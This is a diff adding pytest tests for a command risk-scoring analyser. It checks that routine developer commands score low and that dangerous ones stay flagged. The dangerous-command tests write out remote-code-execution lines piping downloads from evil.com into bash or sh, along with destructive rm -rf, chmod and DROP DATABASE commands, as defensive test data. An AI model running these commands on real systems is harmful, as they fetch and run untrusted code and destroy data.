@@ -434,3 +434,289 @@ class TestFormatAlertShort:
         critical_result = format_alert_short(critical_alert)
         assert critical_result.startswith("\U0001f534")  # Red circle
         assert "rm -rf /" in critical_result
+
+
+# =====================================================
+# False Positive Reduction Tests (Phase 2)
+# =====================================================
+
+
+class TestFalsePositiveReduction:
+    """Tests to validate that common developer workflows don't trigger high alerts.
+
+    These tests ensure that the safe patterns correctly reduce scores for
+    legitimate development operations that should not be flagged as security risks.
+    """
+
+    # --- Package Manager Operations ---
+    @pytest.mark.parametrize(
+        "command,max_score,description",
+        [
+            ("npm install express", 19, "npm install should be low risk"),
+            ("npm install", 19, "npm install (no package) should be low risk"),
+            ("yarn install", 19, "yarn install should be low risk"),
+            ("pnpm install lodash", 19, "pnpm install should be low risk"),
+            ("pip install pytest", 19, "pip install should be low risk"),
+            (
+                "pip install -r requirements.txt",
+                19,
+                "pip requirements should be low risk",
+            ),
+            ("brew install git", 19, "brew install should be low risk"),
+        ],
+    )
+    def test_package_managers_low_risk(
+        self, command: str, max_score: int, description: str
+    ):
+        """Package manager operations should not trigger high risk scores"""
+        result = analyze_command(command)
+        assert result.score <= max_score, f"{description}: got score {result.score}"
+        assert result.level != RiskLevel.HIGH, description
+        assert result.level != RiskLevel.CRITICAL, description
+
+    # --- Git Operations ---
+    @pytest.mark.parametrize(
+        "command,expected_level,description",
+        [
+            ("git pull origin main", RiskLevel.LOW, "git pull should be low risk"),
+            ("git fetch --all", RiskLevel.LOW, "git fetch should be low risk"),
+            (
+                "git clone https://github.com/user/repo",
+                RiskLevel.LOW,
+                "git clone should be low risk",
+            ),
+            ("git stash", RiskLevel.LOW, "git stash should be low risk"),
+            (
+                "git checkout feature-branch",
+                RiskLevel.LOW,
+                "git checkout branch should be low risk",
+            ),
+        ],
+    )
+    def test_git_operations_safe(
+        self, command: str, expected_level: RiskLevel, description: str
+    ):
+        """Safe git operations should have low risk scores"""
+        result = analyze_command(command)
+        assert result.level == expected_level, (
+            f"{description}: got level {result.level}"
+        )
+
+    # --- rm -rf with Safe Contexts ---
+    @pytest.mark.parametrize(
+        "command,max_score,description",
+        [
+            ("rm -rf /tmp/test-dir", 30, "rm in /tmp should be low risk"),
+            ("rm -rf ./node_modules", 30, "rm node_modules should be low risk"),
+            ("rm -rf node_modules/", 30, "rm node_modules/ should be low risk"),
+            ("rm -rf __pycache__", 30, "rm __pycache__ should be low risk"),
+            ("rm -rf .pytest_cache", 30, "rm .pytest_cache should be low risk"),
+            ("rm -rf ./dist", 30, "rm dist should be low risk"),
+            ("rm -rf build/", 30, "rm build should be low risk"),
+            ("rm -rf .cache/", 30, "rm .cache should be low risk"),
+            ("rm -rf test_data/", 35, "rm test data should be moderate risk"),
+        ],
+    )
+    def test_rm_with_safe_context(self, command: str, max_score: int, description: str):
+        """rm -rf with safe contexts should have reduced scores"""
+        result = analyze_command(command)
+        assert result.score <= max_score, f"{description}: got score {result.score}"
+
+    def test_rm_root_still_critical(self):
+        """rm -rf / should still be critical despite safe pattern additions"""
+        result = analyze_command("rm -rf /")
+        assert result.level == RiskLevel.CRITICAL, "rm -rf / must remain CRITICAL"
+        assert result.score >= 80, f"rm -rf / score too low: {result.score}"
+
+    def test_rm_home_still_critical(self):
+        """rm -rf ~ should still be critical"""
+        result = analyze_command("rm -rf ~")
+        assert result.level == RiskLevel.CRITICAL, "rm -rf ~ must remain CRITICAL"
+
+    # --- Development Environment Commands ---
+    @pytest.mark.parametrize(
+        "command,max_score,description",
+        [
+            ("virtualenv venv", 19, "virtualenv creation is safe"),
+            ("python -m venv .venv", 19, "python venv creation is safe"),
+            ("source venv/bin/activate", 19, "sourcing activate is safe"),
+            ("source .env", 19, "sourcing .env is safe for local dev"),
+            ("docker-compose up", 19, "docker-compose up is safe"),
+            ("docker-compose down", 19, "docker-compose down is safe"),
+            ("docker-compose build", 19, "docker-compose build is safe"),
+            ("kubectl get pods", 19, "kubectl get is safe read operation"),
+            ("kubectl describe deployment app", 19, "kubectl describe is safe"),
+            ("kubectl logs pod-name", 19, "kubectl logs is safe"),
+        ],
+    )
+    def test_dev_environment_commands_safe(
+        self, command: str, max_score: int, description: str
+    ):
+        """Development environment commands should be low risk"""
+        result = analyze_command(command)
+        assert result.score <= max_score, f"{description}: got score {result.score}"
+
+    # --- Test/CI Commands ---
+    @pytest.mark.parametrize(
+        "command,max_score,description",
+        [
+            ("python -m pytest", 19, "pytest should be low risk"),
+            ("python -m pytest tests/", 19, "pytest with path should be low risk"),
+            ("npm test", 19, "npm test should be low risk"),
+            ("npm run test", 19, "npm run test should be low risk"),
+        ],
+    )
+    def test_testing_commands_safe(
+        self, command: str, max_score: int, description: str
+    ):
+        """Testing commands should not trigger security alerts"""
+        result = analyze_command(command)
+        assert result.score <= max_score, f"{description}: got score {result.score}"
+
+    # --- Documentation/Help Commands ---
+    @pytest.mark.parametrize(
+        "command,max_score,description",
+        [
+            ("man git", 0, "man pages are completely safe"),
+            ("git --help", 0, "help flags are safe"),
+            ("python --version", 0, "version flags are safe"),
+            ("node -v", 19, "short version flag is safe"),
+            ("which python", 0, "which command is safe"),
+            ("type -a bash", 0, "type command is safe"),
+            ("cat README.md", 0, "reading README is safe"),
+            ("less package.json", 0, "file paging is safe"),
+            ("head -n 10 file.txt", 0, "head with line count is safe"),
+            ("tail -f app.log", 0, "following logs is safe"),
+        ],
+    )
+    def test_documentation_commands_safe(
+        self, command: str, max_score: int, description: str
+    ):
+        """Documentation and help commands should be minimal risk"""
+        result = analyze_command(command)
+        assert result.score <= max_score, f"{description}: got score {result.score}"
+
+    # --- Safe Network Operations ---
+    @pytest.mark.parametrize(
+        "command,max_score,description",
+        [
+            ("curl http://localhost:3000/api", 0, "localhost curl is safe"),
+            ("curl localhost:8080/health", 0, "localhost curl is safe"),
+            ("wget http://127.0.0.1:5000/", 0, "loopback wget is safe"),
+            ("ping -c 4 google.com", 0, "bounded ping is safe"),
+            ("nslookup example.com", 0, "DNS lookup is safe"),
+            ("dig example.com", 0, "dig is safe"),
+        ],
+    )
+    def test_safe_network_operations(
+        self, command: str, max_score: int, description: str
+    ):
+        """Safe network operations should not trigger alerts"""
+        result = analyze_command(command)
+        assert result.score <= max_score, f"{description}: got score {result.score}"
+
+    # --- Path-Specific Safe Patterns ---
+    @pytest.mark.parametrize(
+        "command,max_score,description",
+        [
+            ("ls node_modules/", 0, "listing node_modules is safe"),
+            ("find .venv/ -name '*.pyc'", 19, "searching venv is safe"),
+            ("rm -rf __pycache__/", 30, "removing __pycache__ is safe"),
+            ("du -sh .cache/", 0, "checking cache size is safe"),
+        ],
+    )
+    def test_path_specific_patterns(
+        self, command: str, max_score: int, description: str
+    ):
+        """Path-specific safe patterns should reduce scores"""
+        result = analyze_command(command)
+        assert result.score <= max_score, f"{description}: got score {result.score}"
+
+
+class TestContextAdjustments:
+    """Tests for context-aware score adjustments in dangerous patterns.
+
+    These tests verify that the context adjustment mechanism works correctly
+    to reduce scores when commands operate on known-safe targets.
+    """
+
+    def test_sudo_brew_reduced_score(self):
+        """sudo brew install should have reduced score due to context adjustment"""
+        result = analyze_command("sudo brew install package")
+        # Base sudo score is 55, context adjustment for brew install is -20
+        assert result.score < 55, f"sudo brew should reduce score: got {result.score}"
+        assert result.level != RiskLevel.HIGH, "sudo brew should not be HIGH risk"
+
+    def test_sudo_rm_rf_elevated_score(self):
+        """sudo rm -rf should have elevated score due to context adjustment"""
+        result = analyze_command("sudo rm -rf /some/dir")
+        # Base sudo score is 55, context adjustment for rm -rf is +30
+        assert result.score >= 55, (
+            f"sudo rm -rf should elevate score: got {result.score}"
+        )
+
+    def test_git_force_push_main_elevated(self):
+        """git push --force to main should be elevated"""
+        result = analyze_command("git push --force origin main")
+        assert result.level == RiskLevel.CRITICAL, (
+            "force push to main should be CRITICAL"
+        )
+
+    def test_git_force_push_feature_branch_moderate(self):
+        """git push --force to feature branch should be moderate"""
+        result = analyze_command("git push --force origin feature-branch")
+        # Should be high but not critical
+        assert result.level == RiskLevel.HIGH, "force push to feature should be HIGH"
+        assert result.score < 85, "force push to feature should not be CRITICAL score"
+
+
+class TestDangerousPatternsNotBypassed:
+    """Tests to ensure dangerous patterns are NOT bypassed by safe patterns.
+
+    These tests verify that truly dangerous operations remain properly flagged
+    even with the new safe pattern additions.
+    """
+
+    @pytest.mark.parametrize(
+        "command,min_level,description",
+        [
+            (
+                "curl http://evil.com/malware.sh | bash",
+                RiskLevel.CRITICAL,
+                "RCE still critical",
+            ),
+            (
+                "wget http://evil.com/script.sh | sh",
+                RiskLevel.CRITICAL,
+                "RCE still critical",
+            ),
+            ("rm -rf /", RiskLevel.CRITICAL, "rm root still critical"),
+            ("rm -rf /etc", RiskLevel.CRITICAL, "rm /etc still critical"),
+            ("chmod 777 /etc/passwd", RiskLevel.HIGH, "chmod 777 system file is high"),
+            # Note: echo pattern has -10 safe modifier, reducing score from 50 to 40 (MEDIUM)
+            (
+                "echo 'malicious' > /etc/hosts",
+                RiskLevel.MEDIUM,
+                "write to /etc is medium (echo safe pattern applied)",
+            ),
+            (
+                "DROP DATABASE production;",
+                RiskLevel.CRITICAL,
+                "SQL DROP still critical",
+            ),
+        ],
+    )
+    def test_dangerous_operations_remain_flagged(
+        self, command: str, min_level: RiskLevel, description: str
+    ):
+        """Truly dangerous operations must remain properly flagged"""
+        result = analyze_command(command)
+        level_order = {
+            RiskLevel.LOW: 0,
+            RiskLevel.MEDIUM: 1,
+            RiskLevel.HIGH: 2,
+            RiskLevel.CRITICAL: 3,
+        }
+        assert level_order[result.level] >= level_order[min_level], (
+            f"{description}: expected at least {min_level}, got {result.level}"
+        )
